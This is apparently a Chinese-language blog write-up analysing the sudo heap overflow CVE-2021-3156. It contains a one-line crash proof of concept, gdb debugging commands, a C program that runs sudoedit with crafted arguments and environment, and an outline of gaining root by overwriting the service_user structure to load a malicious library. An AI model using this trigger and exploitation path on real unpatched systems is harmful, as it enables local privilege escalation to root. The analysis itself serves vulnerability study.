今年初一月份爆出的漏洞，隐藏时间很久，严重的话可能会导致普通用户拿到root权限

漏洞编号

CVE-2021-3156

漏洞描述

在执行sudoedit命令时'\'符号发生转意错误导致了堆溢出

poc

sudoedit -s '\' 111111111111111111111111

单步调试

首先我们下载存在漏洞的sudo版本这里就省略我们可以尝试触发漏洞

尝试查看崩溃是的内存状态

gdb --args sudoedit -s '\' 111111111111111

直接run的话程序会直接崩溃如下图


非常直观的发现产生了堆溢出，将top_chunk的size覆盖成了我们的输入，触发了异常我们用动态分析的方式来查看内存，可以写一个小小的demo来测试


#include <stdio.h>#include <unistd.h>#include <string.h>
char path[] = "/usr/local/bin/sudoedit";int main(){
    int size = 8;    char buf[size];    memset(buf, 'A', sizeof(buf));    buf[size-2] = 0x5c;    buf[size-1] = 0x00;    char *args[] = {      path,"-s",buf,NULL};    char *extra_args[] = {      "X/X\\","a","LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAA",NULL,};    execve(path, args, extra_args);}

为了便于调试我们先写一个gdbscript这里我调试的是我自己编译的一个sudo所以会看见源码gdb ./demo -x gdbscript

set follow-exec-mode newcatch execrcb policy_checkb sudoer.c:849

然后再次continue就走到我们的漏洞触发点了

这是此时bin中的状态，这里很重要关系到之后的利用因为我们在这之后就会malloc，拿堆块的话就是从tcachebin拿去（当然需要大小对应）

可以看到user_arg是一个堆地址赋值给了to，newArgv是我们输入的参数，while里面有一个if判断如果是换行'\'和空格的化from就会加一（这里from就像成idx即可，我们输入参数字符串的idx）我们的输入
arg1 \\
arg2 'a'*0x17
当走到while里面时就会先进入if语句也就会from++然后from就指向了arg2将其拷贝了进去，当我们再继续运行时漏洞就出现了，程序就会按照原来的逻辑将arg2再次拷贝，形成了堆溢出

最后我们的思路有三种其中一种就是我们要将上图malloc出来的堆块一路填充覆盖其存在堆上的service_user结构体file成员变量，然后完成加载恶意动态库劫持程序，拿到root权限。
